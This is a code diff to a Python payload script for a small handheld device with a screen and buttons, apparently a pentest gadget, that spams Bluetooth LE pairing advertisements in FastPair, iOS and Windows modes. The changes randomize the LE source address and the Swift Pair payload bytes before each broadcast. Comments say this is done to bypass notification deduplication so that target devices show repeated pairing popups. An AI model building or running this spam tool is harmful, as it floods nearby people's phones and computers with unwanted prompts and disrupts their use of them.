@@ -41,6 +41,7 @@ import LCD_1in44, LCD_Config
 from PIL import Image, ImageDraw, ImageFont
 from payloads._display_helper import ScaledDraw, scaled_font
 from payloads._input_helper import get_button
+from payloads._iface_helper import select_bt_interface
 
 PINS = {
     "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
@@ -58,7 +59,7 @@ font = scaled_font()
 # ---------------------------------------------------------------------------
 # Constants
 # ---------------------------------------------------------------------------
-HCI_DEV = "hci0"
+HCI_DEV = None  # set in main() via select_bt_interface
 MODES = ["FastPair", "iOS", "Windows", "ALL"]
 SPEED_LEVELS = [200, 150, 100, 75, 50]  # ms between broadcasts
 SPEED_LABELS = ["Slow", "Med", "Fast", "Vfast", "Max"]
@@ -125,12 +126,23 @@ def _hci_up():
 
 
 def _hci_set_adv_data(hex_bytes):
-    """Set advertising data via hcitool cmd."""
-    length = f"{len(hex_bytes):02X}"
-    hex_str = " ".join(f"{b:02X}" for b in hex_bytes)
+    """Set advertising data via hcitool cmd.
+
+    Sends exactly 31 bytes: first byte = data length, rest = data padded to 30.
+    This matches the exact format confirmed to trigger Windows Swift Pair popups.
+    """
+    data = list(hex_bytes)
+    data_len = len(data)
+    # Pad data to 30 bytes
+    while len(data) < 30:
+        data.append(0x00)
+    data = data[:30]
+    # Final: [length] + [30 bytes data] = 31 bytes total
+    full = [data_len] + data
+    hex_str = " ".join(f"{b:02X}" for b in full)
     cmd = (
         f"sudo hcitool -i {HCI_DEV} cmd 0x08 0x0008 "
-        f"{length} {hex_str}"
+        f"{hex_str}"
     )
     return subprocess.run(
         cmd.split(), capture_output=True, text=True, timeout=5,
@@ -154,9 +166,9 @@ def _hci_disable_adv():
 
 
 def _hci_set_adv_params():
-    """Set advertising parameters for non-connectable undirected."""
+    """Set advertising parameters for non-connectable undirected with random address."""
     # Min interval=0x00A0 (100ms), Max=0x00A0, type=3 (non-conn),
-    # own addr=0, peer addr type=0, peer=00:00:00:00:00:00,
+    # own addr=1 (RANDOM), peer addr type=0, peer=00:00:00:00:00:00,
     # channel map=7, filter=0
     subprocess.run(
         [
@@ -165,7 +177,7 @@ def _hci_set_adv_params():
             "A0", "00",   # min interval
             "A0", "00",   # max interval
             "03",         # adv type: non-connectable
-            "00",         # own address type
+            "01",         # own address type: RANDOM (use LE random address)
             "00",         # peer address type
             "00", "00", "00", "00", "00", "00",  # peer address
             "07",         # channel map (all)
@@ -175,18 +187,61 @@ def _hci_set_adv_params():
     )
 
 
+def _hci_reset():
+    """Reset the HCI device between advertisement cycles."""
+    subprocess.run(
+        ["sudo", "hciconfig", HCI_DEV, "reset"],
+        capture_output=True, timeout=5,
+    )
+
+
+def _randomize_mac():
+    """Set a random BLE address so each advert looks like a new device.
+
+    Uses LE Set Random Address HCI command (0x08 0x0005) which sets
+    the address used for advertising when using random address type.
+    Also changes adv params to use random address (own_addr_type=1).
+    """
+    mac_bytes = [random.randint(0, 255) for _ in range(6)]
+    # Set top 2 bits of first byte for static random address
+    mac_bytes[0] = (mac_bytes[0] | 0xC0)
+    mac_hex = " ".join(f"{b:02X}" for b in mac_bytes)
+    # LE Set Random Address (OGF 0x08, OCF 0x0005)
+    subprocess.run(
+        ["sudo", "hcitool", "-i", HCI_DEV, "cmd", "0x08", "0x0005"] + mac_hex.split(),
+        capture_output=True, timeout=5,
+    )
+
+
 def _broadcast_once(adv_bytes, label):
-    """Set advertising data, enable, brief pause, disable."""
+    """Broadcast one advertisement with random LE address.
+
+    Uses LE Set Random Address before each advert so the target sees
+    a different source MAC each time, bypassing notification dedup.
+    No full reset between cycles for speed.
+    """
     global packets_sent, last_error, last_device
 
     try:
         _hci_disable_adv()
+        _randomize_mac()
+        _hci_set_adv_params()
         result = _hci_set_adv_data(adv_bytes)
         if result.returncode != 0:
-            with lock:
-                last_error = (result.stderr or "hci err")[:30]
-            return False
+            # Full reset on error
+            _hci_reset()
+            time.sleep(0.3)
+            _hci_up()
+            _randomize_mac()
+            _hci_set_adv_params()
+            result = _hci_set_adv_data(adv_bytes)
+            if result.returncode != 0:
+                with lock:
+                    last_error = (result.stderr or "hci err").strip()[:30]
+                return False
         _hci_enable_adv()
+        time.sleep(1)
+        _hci_disable_adv()
         with lock:
             packets_sent += 1
             last_device = label
@@ -236,21 +291,28 @@ def _build_ios_adv():
 
 
 def _build_swiftpair_adv():
-    """Build Microsoft Swift Pair advertisement."""
-    name = random.choice(SWIFT_PAIR_NAMES)
-    rssi = random.randint(0xC0, 0xFF)  # RSSI byte
-    # Flags + Manufacturer Specific Data (Microsoft 0x0006)
-    name_bytes = name.encode("utf-8")[:8]
-    data_len = 4 + len(name_bytes)
+    """Build Microsoft Swift Pair advertisement with unique random bytes each call.
+
+    Windows deduplicates by advert content. Randomizing the trailing bytes
+    and sub-scenario makes each advertisement appear as a new device.
+    """
+    sub_scenario = random.choice([0x00, 0x01, 0x02])
+    rssi = random.randint(0x70, 0xFF)
+    # Random display hash bytes (makes each advert unique)
+    rand_tail = bytes(random.randint(0, 255) for _ in range(16))
+
     adv = bytearray([
         0x02, 0x01, 0x06,          # Flags
-        data_len, 0xFF,             # Length, Type=Manufacturer Specific
-        0x06, 0x00,                 # Microsoft Company ID (little-endian)
-        0x03,                       # Scenario: Swift Pair
-        rssi,                       # RSSI pathlos
+        0x03, 0x03, 0x12, 0x18,    # Service UUID: 0x1812 (HID)
+        0x15, 0xFF,                 # Length=21, Type=Manufacturer Specific
+        0x06, 0x00,                 # Microsoft Company ID
+        0x03,                       # Swift Pair beacon type
+        sub_scenario,               # Sub-scenario (varies)
+        rssi,                       # RSSI (varies)
     ])
-    adv.extend(name_bytes)
-    return bytes(adv), f"SP:{name}"
+    adv.extend(rand_tail)
+    adv = adv[:30]
+    return bytes(adv), "SP:Windows"
 
 
 # ---------------------------------------------------------------------------
@@ -292,8 +354,10 @@ def _start_spam():
         if spamming:
             return
         spamming = True
+    _hci_reset()
+    time.sleep(0.3)
     _hci_up()
-    _hci_set_adv_params()
+    time.sleep(0.1)
     threading.Thread(target=_spam_loop, daemon=True).start()
 
 
@@ -385,7 +449,12 @@ def _draw_screen():
 # ---------------------------------------------------------------------------
 
 def main():
-    global mode_idx, speed_idx
+    global mode_idx, speed_idx, HCI_DEV
+
+    HCI_DEV = select_bt_interface(LCD, font, PINS, GPIO)
+    if not HCI_DEV:
+        GPIO.cleanup()
+        return 1
 
     # Splash
     img = Image.new("RGB", (WIDTH, HEIGHT), "black")
